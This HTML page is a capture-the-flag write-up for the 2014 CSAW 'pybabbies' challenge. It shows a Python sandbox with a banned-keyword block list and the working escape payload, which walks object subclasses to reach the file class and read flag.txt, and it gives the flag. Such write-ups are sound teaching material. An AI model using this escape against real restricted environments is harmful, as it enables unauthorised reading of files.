<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<title>2014 CSAW CTF Qual - Exploitation 200 - pybabbies</title>
	<link rel="stylesheet" type="text/css" href="/css/all.min.css">
	<link rel="stylesheet" type="text/css" href="http://fonts.googleapis.com/css?family=Ubuntu+Mono:400">
	<link rel="stylesheet" type="text/css" href="http://fonts.googleapis.com/css?family=Open+Sans">
</head>
<body>
	<div id="content">
	  <div id="post">
		<h1>2014 CSAW CTF Qual - Exploitation 200 - pybabbies</h1>
		<!--<div id="postinfo">
			<div id="postdate"></div>
			<div id="posttags">tags: </div>
		</div>-->
		<div id="postbody">
<ol>
	<li>given source code of Python sandbox <code>pyshell.py</code>, need to find key</li>
	<li>inspecting reveals all <code>__builtins__</code> have been cleared, except <code>raw_input</code> and <code>print</code>; additionally "<code>sys</code>" being banned means "system" cannot be used as well; matches are case-insensitive</li>
	<li>if all these checks pass, then the input command string is <code>exec</code>'ed</li>
	<li>refactored the given pyshell.py file to facilitate local testing</li>
<table class="highlighttable"><tr><td class="code"><div class="highlight"><pre><span class="c">#!/usr/bin/env python</span>
<span class="c">#-*- coding: utf-8 -*-</span>

<span class="kn">from</span> <span class="nn">__future__</span> <span class="kn">import</span> <span class="n">print_function</span>

<span class="k">print</span><span class="p">(</span><span class="s">&quot;Welcome to my Python sandbox! Enter commands below!&quot;</span><span class="p">)</span>
<span class="n">banned</span> <span class="o">=</span> <span class="p">[</span><span class="s">&quot;import&quot;</span><span class="p">,</span> <span class="s">&quot;exec&quot;</span><span class="p">,</span> <span class="s">&quot;eval&quot;</span><span class="p">,</span> <span class="s">&quot;pickle&quot;</span><span class="p">,</span> <span class="s">&quot;os&quot;</span><span class="p">,</span> <span class="s">&quot;subprocess&quot;</span><span class="p">,</span>
	<span class="s">&quot;kevin sucks&quot;</span><span class="p">,</span> <span class="s">&quot;input&quot;</span><span class="p">,</span> <span class="s">&quot;banned&quot;</span><span class="p">,</span> <span class="s">&quot;cry sum more&quot;</span><span class="p">,</span> <span class="s">&quot;sys&quot;</span><span class="p">]</span>
<span class="n">targets</span> <span class="o">=</span> <span class="n">__builtins__</span><span class="o">.</span><span class="n">__dict__</span><span class="o">.</span><span class="n">keys</span><span class="p">()</span>
<span class="n">targets</span><span class="o">.</span><span class="n">remove</span><span class="p">(</span><span class="s">&quot;raw_input&quot;</span><span class="p">)</span>
<span class="n">targets</span><span class="o">.</span><span class="n">remove</span><span class="p">(</span><span class="s">&quot;print&quot;</span><span class="p">)</span>
<span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">targets</span><span class="p">:</span> <span class="k">del</span> <span class="n">__builtins__</span><span class="o">.</span><span class="n">__dict__</span><span class="p">[</span><span class="n">x</span><span class="p">]</span>
<span class="n">stmts</span> <span class="o">=</span> <span class="p">[</span>
<span class="s">&quot;print({}.__class__.__bases__[0].__subclasses__()[40](&#39;./flag.txt&#39;).read())&quot;</span>
<span class="p">]</span>
<span class="k">for</span> <span class="n">i</span>, <span class="n">data</span> <span class="ow">in</span> <span class="k">enumerate</span>(<span class="n">stmts</span><span class="p">):</span>
	<span class="k">for</span> <span class="n">no</span> <span class="ow">in</span> <span class="n">banned</span><span class="p">:</span>
		<span class="k">if</span> <span class="n">no</span><span class="o">.</span><span class="n">lower</span><span class="p">()</span> <span class="ow">in</span> <span class="n">data</span><span class="o">.</span><span class="n">lower</span><span class="p">():</span>
			<span class="k">print</span><span class="p">(</span><span class="s">&quot;offending term:&quot;</span><span class="o">,</span><span class="n">no</span><span class="p">)</span>
			<span class="k">break</span>
	<span class="k">else</span><span class="p">:</span>
		<span class="k">print</span><span class="p">(</span><span class="n">i</span><span class="p">,</span><span class="s">&quot;:&quot;</span><span class="p">,</span><span class="n">data</span><span class="p">)</span>
		<span class="k">exec</span> <span class="n">data</span>
</pre></div>
</td></tr></table>
<li><code>{}.__class__...</code> could instead be <code>().__class__...</code>, to access the base class of <code>tuple</code> instead of <code>dict</code>; index 40 is <code>file</code>;<br> so the overall command is just reading the contents of a file</li>
<li>guessed rightly that filename is <i>flag.txt</i>; otherwise would have tried <i>key.txt</i></li>
<li>flag{<span class="flag">definitely_not_intro_python</span>}</li>
</ol>
		</div>
	</div>
</body>
</html>
